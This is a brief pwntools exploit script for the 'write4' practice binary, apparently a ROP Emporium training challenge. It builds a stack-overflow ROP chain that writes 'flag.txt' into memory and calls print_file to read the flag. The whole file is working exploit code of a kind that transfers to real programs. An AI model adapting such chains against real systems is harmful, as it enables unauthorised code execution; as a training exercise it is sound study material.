from pwn import *

elf = ELF('./write4')
p = elf.process()

p.recvuntil('>')

#0x0000000000400628 : mov QWORD PTR [r14],r15
#0x0000000000400690 : pop r14 ; pop r15 ; ret
#0x0000000000400693 : pop rdi ; ret

print_file = p64(0x0000000000400510)

payload = b'A'*40
payload += p64(0x0000000000400690)
payload += p64(0x00601028)
payload += b'flag.txt'
payload += p64(0x0000000000400628)

payload += p64(0x0000000000400693)
payload += p64(0x00601028)
payload += print_file

p.sendline(payload)
p.recvline()

print(p.recvall())

